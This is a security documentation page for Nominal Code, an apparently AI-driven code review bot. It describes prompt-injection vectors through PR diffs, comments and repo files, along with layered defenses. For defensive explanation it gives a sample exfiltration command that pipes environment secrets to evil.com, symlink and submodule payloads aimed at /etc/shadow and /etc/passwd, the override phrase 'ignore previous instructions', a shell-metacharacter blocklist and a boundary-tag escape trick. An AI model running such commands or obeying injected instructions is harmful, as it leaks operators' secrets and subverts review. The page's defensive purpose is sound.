# Security

This page covers the security model, threat surface, and hardening recommendations for Nominal Code — with particular focus on LLM-related risks.

## Trust Model

| Category | Input | Trust Level |
|----------|-------|-------------|
| Configuration | Environment variables, system prompts, webhook secrets, `ALLOWED_USERS` | **Trusted** — set by the operator |
| User content | PR diffs, PR comments, repository file content, webhook payloads | **Untrusted** — controlled by external contributors |
| Per-repo overrides | `.nominal/guidelines.md`, `.nominal/languages/{lang}.md` | **Semi-trusted** — committed by repo maintainers, injected into the system prompt |

!!! warning "Primary attack surface"

    PR diffs and repository content are the primary attack surface. Any contributor who can open a PR or push code can influence what the LLM sees and how it reasons.

## LLM Security

### Prompt Injection Risks

Prompt injection occurs when untrusted input manipulates the LLM into ignoring its instructions or performing unintended actions. In the context of AI code review, the main attack vectors are:

1. **Via PR diff** — malicious instructions embedded in code comments, docstrings, or string literals that the reviewer agent reads during analysis.

2. **Via PR comments** — adversarial text in the existing discussion context. When the agent processes conversation history, injected instructions in earlier comments can influence its behavior.

3. **Via repository content** — files read by the agent during review (e.g. configuration files, documentation, or other source files) may contain adversarial content designed to steer the agent.

4. **Via `.nominal/guidelines.md`** — per-repo guideline overrides are injected directly into the system prompt. A compromised or malicious guideline file can alter the agent's review behavior.

### Built-in Mitigations

The following mechanisms limit the impact of a successful prompt injection:

- **Read-only tool restrictions** — the reviewer bot can only use `Read`, `Glob`, `Grep`, and `Bash(git clone*)`. Even if prompt-injected, it cannot modify files, push code, or call arbitrary commands.

- **Bash command allowlisting** — bash commands are checked against `fnmatch` patterns before execution. Commands that don't match an allowed pattern are rejected with an error.

- **Shell injection blocking** — when bash patterns are active, commands are validated against a blocklist of shell metacharacters (`$`, `` ` ``, `|`, `;`, `&`) and dangerous builtins (`eval`, `exec`, `source`). This prevents attacks like `git clone https://evil.com/$(cat /proc/self/environ)` that would pass the fnmatch allowlist but exfiltrate secrets via shell expansion.

- **Git clone host validation** — `git clone` commands are restricted to known hostnames (default: `github.com`, `gitlab.com`). Clones targeting unknown hosts are rejected, preventing data exfiltration to attacker-controlled servers. The allowlist is configurable via `allowed_clone_hosts` for self-hosted instances.

- **Git clone hardening** — all `git clone` and `git fetch` operations are hardened with three config overrides that prevent malicious repositories from executing code during checkout:
    - `core.hooksPath=/dev/null` — disables all git hooks (`post-checkout`, `post-merge`, `pre-commit`, etc.), preventing a repo from executing arbitrary shell scripts via hook files.
    - `core.symlinks=false` — git creates regular files instead of symlinks, preventing a repo from planting a symlink like `config.py -> /etc/shadow` that escapes the workspace directory.
    - `protocol.file.allow=never` — blocks the `file://` protocol in submodules, preventing `.gitmodules` entries like `url = file:///etc/passwd` from reading arbitrary local files during submodule initialization.

- **Environment sanitization** — subprocess tools (`Bash`, `Grep`) run with a sanitized environment containing only safe variables (`PATH`, `HOME`, `LANG`, etc.). Secrets like `GITLAB_TOKEN`, `REDIS_URL`, and API keys are stripped from the subprocess environment using an allowlist approach. This is the primary defense against secret exfiltration via tool execution.

- **Output sanitization** — all tool outputs are scanned for known secret patterns (GitLab PATs, GitHub PATs, OpenAI keys, Google API keys, private keys, bearer tokens) and redacted with `[REDACTED]` before being returned to the LLM. Review output (summaries and inline comments) is also sanitized before being posted to the platform, preventing the LLM from embedding leaked secrets in PR comments.

- **Prompt boundary tags** — untrusted content (diffs, comments, user prompts, file paths, branch names) is wrapped in XML boundary tags (`<untrusted-diff>`, `<untrusted-comment>`, etc.) before insertion into LLM prompts. The system prompt includes anchoring instructions that tell the LLM to treat tagged content as opaque data, not as instructions to follow.

- **`ALLOWED_USERS` gating** — only users listed in `ALLOWED_USERS` can trigger the agent via comments. Unauthorized users are silently ignored, preventing external actors from directly prompting the agent.

- **Turn caps** — the reviewer agent runs in a multi-turn loop (default 8 turns). Explore sub-agents spawned via the Agent tool have a separate turn budget (default 32). `MAX_RESPONSE_TOKENS` (16,384) caps each LLM response.

- **Diff line validation** — review findings are validated against the actual diff. Findings that reference lines outside the diff are filtered out and appended to the summary instead.

### Prompt Boundary Tags

All untrusted content inserted into LLM prompts is wrapped in XML
boundary tags that mark data boundaries. The system prompt includes
anchoring instructions telling the LLM to treat tagged content as data
only, not as instructions.

| Tag | Content | Source |
|-----|---------|--------|
| `<untrusted-diff>` | PR patch | `_build_reviewer_prompt` |
| `<untrusted-comment>` | Existing comment bodies | `_format_existing_comments` |
| `<untrusted-request>` | User mention prompt | Both prompt builders |
| `<file-path>` | File paths | Reviewer prompt builder |
| `<branch-name>` | PR branch name | Reviewer prompt builder |
| `<repo-guidelines>` | Repo guidelines | `resolve_system_prompt` |

#### Attacks mitigated

- **Direct instruction injection** — malicious text in diffs or
  comments that says "ignore previous instructions" is clearly
  inside a data boundary, making the LLM far less likely to follow it.
- **Role impersonation** — content pretending to be system prompt
  text (e.g. "## New Instructions") is enclosed in a tag the system
  prompt explicitly marks as untrusted data.
- **Context escape** — without boundaries, carefully placed markdown
  (e.g. closing a code fence then adding instructions) can blend into
  the surrounding prompt. XML tags create a stronger delimiter that
  is harder to escape from.

#### Limitations

Boundary tags are a defense-in-depth measure, not a guarantee. A
determined attacker can still embed closing tags (e.g.
`</untrusted-diff>`) inside content. The anchoring instructions
in the system prompt are the secondary defense for this case.
Combined with tool restrictions, environment sanitization, and
output redaction, boundary tags significantly raise the bar for
successful prompt injection.

### Recommendations

- **Keep `ALLOWED_USERS` tight** — only grant access to trusted team members. In open-source repos, this prevents external contributors from prompting the agent directly.

- **Review `.nominal/guidelines.md` changes carefully** — these files are injected into the system prompt. Treat changes to them with the same scrutiny as CI configuration changes.

- **For open-source repos, prefer CI mode** — CI mode runs automatically on PR events without accepting user-supplied prompts, eliminating comment-based injection vectors entirely.

## Webhook Verification

### GitHub

Webhook payloads are verified using HMAC-SHA256. The `X-Hub-Signature-256` header is compared against the expected signature using `hmac.compare_digest()` for constant-time comparison:

```python
expected = "sha256=" + hmac.new(
    webhook_secret.encode(), body, hashlib.sha256,
).hexdigest()

return hmac.compare_digest(signature, expected)
```

### GitLab

GitLab webhooks are verified by comparing the `X-Gitlab-Token` header against the configured shared secret, also using `hmac.compare_digest()`.

!!! warning "Verification skipped when no secret is configured"

    If `GITHUB_WEBHOOK_SECRET` or `GITLAB_WEBHOOK_SECRET` is not set, signature verification is skipped entirely and all payloads are accepted. Always configure a webhook secret in production.

### Request Size Limit

The webhook server enforces a **5 MB** maximum request body size. Payloads exceeding this limit are rejected before processing.

## Authentication

### GitHub PAT Mode

Set `GITHUB_TOKEN` to a personal access token.

### GitHub App Mode (Recommended)

GitHub App authentication uses RS256 JWTs to request short-lived installation tokens:

- JWTs expire after **600 seconds**
- Installation tokens are cached for **1 hour** and refreshed with a **5-minute** margin
- Tokens are automatically rotated — no long-lived secrets beyond the private key
- Scoped to the specific permissions granted to the App

Configure via `GITHUB_APP_ID`, `GITHUB_APP_PRIVATE_KEY` (inline) or `GITHUB_APP_PRIVATE_KEY_PATH` (file path), and optionally `GITHUB_INSTALLATION_ID`.

### GitLab

Set `GITLAB_TOKEN` for full access.

## Authorization

### Comment Events

When a user mentions the bot in a PR comment, the author's username is checked against the `ALLOWED_USERS` frozenset. Comments from unauthorized users are silently ignored:

```python
if event.author_username not in config.allowed_users:
    logger.warning("Ignoring comment from unauthorized user: %s", event.author_username)
    return
```

`ALLOWED_USERS` must contain at least one username — the server refuses to start without it.

### Auto-trigger Events

PR lifecycle events (open, push, reopen, ready-for-review) configured in `REVIEWER_TRIGGERS` bypass the `ALLOWED_USERS` check. These events have no user-supplied prompt, and draft/WIP PRs are skipped.

## Tool Restrictions

| Capability | Value |
|------------|-------|
| **Available tools** | `Read`, `Glob`, `Grep`, `Bash(git clone*)` |
| **Bash commands** | Only `git clone*` (fnmatch) + shell injection check |
| **Git clone hosts** | `github.com`, `gitlab.com` (configurable) |
| **Subprocess environment** | Sanitized (allowlisted vars only) |
| **Output sanitization** | Secret patterns redacted |
| **Permission mode** | `bypassPermissions` (with tool allowlist) |
| **Can modify files** | No |
| **Can push code** | No |

## Defense-in-Depth Architecture

Secret leakage prevention is implemented across four layers. Each layer is independent — even if one layer is bypassed, the others continue to protect against exfiltration.

### Layer 1: Environment Sanitization

The `build_sanitized_env()` function in `nominal_code/agent/sandbox.py` filters `os.environ` using an **allowlist** of safe variable names:

```
PATH, HOME, LANG, LC_ALL, TERM, TMPDIR, USER, LOGNAME, SHELL
```

All subprocess tools (`Bash`, `Grep`) receive this filtered environment via the `env=` parameter on `asyncio.create_subprocess_exec`. Secrets like `GITLAB_TOKEN`, `REDIS_URL`, `ANTHROPIC_API_KEY`, and `ENCRYPTION_KEY` are never present in the subprocess.

The allowlist can be extended via `extra_safe_vars` for specific use cases.

### Layer 2: Shell Injection Blocking

When bash patterns are active (i.e., the reviewer bot), commands are validated before execution:

1. **Metacharacter check** — a regex blocks `$`, `` ` ``, `|`, `;`, `&`, and builtins `eval`/`exec`/`source`. This prevents shell expansion attacks that could read environment variables or chain commands.

2. **Clone host validation** — for `git clone` commands, the target URL hostname is parsed and checked against an allowlist. Both HTTPS and SSH-style (`git@host:path`) URLs are supported.

### Layer 3: Output Sanitization

The `sanitize_output()` function scans text for known secret patterns and replaces matches with `[REDACTED]`:

| Pattern | Example |
|---------|---------|
| GitLab PAT | `glpat-...` |
| GitHub PAT / App token | `ghp_...`, `ghs_...` |
| OpenAI key | `sk-...` |
| Google API key | `AIza...` |
| Private keys | `-----BEGIN RSA PRIVATE KEY-----` |
| Bearer tokens | `Bearer eyJ...` |

Output sanitization is applied at two points:

- **Tool results** — before returning to the LLM (prevents the model from reasoning about secrets)
- **Review posting** — summary and all inline comment bodies are sanitized before being submitted to GitHub/GitLab (prevents secrets appearing in PR comments)

## Secret Management

- **All secrets are passed via environment variables** — `GITHUB_TOKEN`, `GITHUB_WEBHOOK_SECRET`, `GITHUB_APP_PRIVATE_KEY`, `GITLAB_TOKEN`, etc.

- **Token redaction in logs** — embedded tokens in clone URLs are redacted using `_redact_url()`, which replaces credentials with `***` before logging:

    ```python
    TOKEN_PATTERN = re.compile(r"(https?://[^:]+:)[^@]+(@)")
    ```

- **Private key options** — GitHub App private keys can be provided inline (`GITHUB_APP_PRIVATE_KEY`) or via file path (`GITHUB_APP_PRIVATE_KEY_PATH`). Inline takes precedence.

- **Never commit `.env` files** — secrets should be injected via your deployment platform's secret management (e.g. Docker secrets, Kubernetes secrets, CI variables).

## Resource Limits

| Resource | Limit | Purpose |
|----------|-------|---------|
| Bash command timeout | 120 seconds | Prevents long-running commands |
| Grep timeout | 30 seconds | Prevents expensive searches |
| HTTP client timeout | 30 seconds | Prevents hanging API calls |
| Max response tokens | 16,384 | Caps LLM output per response |
| Explore sub-agent turns | 32 (default) | Limits exploration loop iterations |
| Reviewer agent turns | 8 (default) | Limits review loop iterations |
| Max notes file size | 50,000 characters | Prevents runaway WriteNotes output |
| Max glob results | 200 | Prevents oversized file listings |
| Max grep output | 30,000 characters | Truncates large search results |
| Max read lines | 2,000 | Truncates large file reads |
| Max line length | 2,000 characters | Truncates long lines |
| Webhook body size | 5 MB | Rejects oversized payloads |
| Shallow clone depth | 1 commit | Minimizes cloned data |
| Tool log truncation | 500 characters | Limits tool output in logs |

## Kubernetes Pod Hardening

When running review jobs on Kubernetes, the job runner applies security hardening to all pod specs unconditionally.

### Container Security Context

Every review container runs with a restricted security context:

| Setting | Default | Purpose |
|---------|---------|---------|
| `readOnlyRootFilesystem` | `true` | Prevents writing to the container filesystem |
| `runAsNonRoot` | `true` | Blocks running as root |
| `runAsUser` | `1000` | Fixed UID matching the Dockerfile `nominal` user |
| `allowPrivilegeEscalation` | `false` | Prevents gaining additional privileges |
| `capabilities.drop` | `["ALL"]` | Drops all Linux capabilities |

### Writable Volumes

Since the root filesystem is read-only, three `emptyDir` volumes are mounted:

- `/workspace` — repository checkout and agent working directory
- `/tmp` — temporary files
- `/home/nominal` — user home directory (uv cache, git config)

### Non-root Docker Images

The Dockerfile creates a dedicated `nominal` user (UID 1000, GID 1000) and `chown`s the application and workspace directories to it. The image does **not** set `USER nominal` because GitHub Actions container jobs require root access to host-mounted volumes. Instead, non-root execution is enforced at the Kubernetes layer via `runAsUser: 1000` and `runAsNonRoot: true` in the pod security context.

### Service Account Token

`automountServiceAccountToken` is set to `false` by default, preventing job pods from accessing the Kubernetes API. This blocks metadata-based attacks (e.g., reading secrets from the API server).

### Network Policy (Deployment Concern)

For additional isolation, deploy a Kubernetes `NetworkPolicy` that:

- Blocks the cloud metadata endpoint (`169.254.169.254`)
- Restricts egress to: LLM API provider, git hosting (`gitlab.com`/`github.com`), Redis
- Denies all ingress to job pods

This is a deployment-level configuration, not managed by the application.

## Network Exposure

- **Default bind address** — the server binds to `0.0.0.0:8080`. Restrict network access using firewall rules or deploy behind a reverse proxy.

- **TLS termination** — the server does not terminate TLS. Use a reverse proxy (e.g. nginx, Caddy, cloud load balancer) for HTTPS.

- **Health endpoint** — `GET /health` returns `{"status": "ok"}` with no sensitive data.

- **Webhook routes** — `POST /webhooks/github` and `POST /webhooks/gitlab` return `401` for requests with invalid signatures when a webhook secret is configured.

- **Per-PR serialization** — concurrent requests for the same PR are queued and processed one at a time, keyed by `(platform, repo, pr_number, bot_type)`. This prevents race conditions but does not limit concurrency across different PRs.
